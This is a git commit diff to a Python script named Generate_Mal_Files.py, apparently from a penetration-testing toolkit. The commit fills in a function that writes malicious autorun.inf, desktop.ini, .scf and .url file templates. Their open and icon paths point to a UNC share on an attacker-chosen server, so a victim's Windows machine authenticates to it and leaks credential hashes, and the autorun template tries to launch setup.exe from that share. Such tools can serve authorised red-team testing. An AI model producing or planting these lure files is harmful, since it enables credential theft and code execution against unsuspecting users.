b64055bced62a2ff9469dcb1d97796b40e29a6e9
Rainer Christian Björn Herold <106552800+Jarl-Bjoern@users.noreply.github.com>
2024-04-21 11:34:12 +0200

    Update Generate_Mal_Files.py

--- Resources/Generator/Generate_Mal_Files.py
+++ Resources/Generator/Generate_Mal_Files.py
@@ -3,4 +3,22 @@
 # Rainer Christian Bjoern Herold
 
 def Generate_Files(mode, target_server, file_name, output_location):
-    pass
+    autorun_file = f"""[autorun]
+open=\\{target_server}\setup.exe
+icon=something.ico
+action=open Setup.exe"""
+
+    ini_file = f"""[.ShellClassInfo]
+IconResource=\\{target_server}\aa"""
+
+    scf_file = f"""[Shell]
+Command=2
+IconFile=\\{target_server}\tools\nc.ico
+[Taskbar]
+Command=ToggleDesktop"""
+
+    url_file = f"""[InternetShortcut]
+URL=setup
+WorkingDirectory=setup
+IconFile=\\{target_server}\%USERNAME%.icon
+IconIndex=1"""
